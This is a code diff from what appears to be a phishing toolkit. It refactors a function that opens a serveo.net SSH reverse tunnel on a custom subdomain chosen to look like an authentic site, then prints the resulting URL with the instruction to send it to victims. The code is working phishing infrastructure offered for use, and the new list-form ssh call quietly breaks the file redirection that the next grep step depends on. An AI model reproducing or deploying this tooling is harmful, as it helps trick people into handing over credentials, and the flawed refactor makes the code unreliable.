@@ -150,31 +150,51 @@ def start_serveo(port):
 
     def custom(port):
 
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo'''.format(default_palette[0], default_palette[2]))
-        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(default_palette[0], default_palette[2]))
+        #print('''
+        #{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        #|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        #|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        #{0}http://github.com/darksecdevelopers
+        #{0}** BY:DARKSEC ** \n\n-------------------------------
+
+        # \n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n
+
+        # \n
+        # \n{0}Insert a custom subdomain for serveo'''.format(default_palette[0], default_palette[2]))
+        simple_informant.global_message()
+        print(localization.lang_start_serveo["serveo_custom_server"])
+        print(localization.lang_start_serveo["make_url_simmilar_to_real_suggestion"])
+        print(localization.lang_start_serveo["insert_custom_subdomain"])
+
+        lnk = input(global_localization.input_line)
         if not ".serveo.net" in lnk:
             lnk += ".serveo.net"
         else:
             pass
-        run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
+        #run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
+        run_command(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-o', 'ServerAliveCountMax=60', '-R','{0}:80:localhost:{1}'.format(lnk, port), 'serveo.net', '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
         wait(7)
         try:
-            output = check_output(
-            "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
+            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
-            print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
-            print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
+            #print('''
+        #{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        #|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        #|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        #{0}http://github.com/darksecdevelopers
+        #{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}
+        # \n-------------------------------'''.format(default_palette[0], default_palette[2]))
+            simple_informant.global_message()
+            print(localization.lang_start_serveo["serveo_custom_server"])
+            
+            #print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-
+            # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
+            # \n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
+            print(localization.lang_start_serveo["send_this_url_suggestion"])
+            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
+            
             print("\n")
 
         except CalledProcessError:
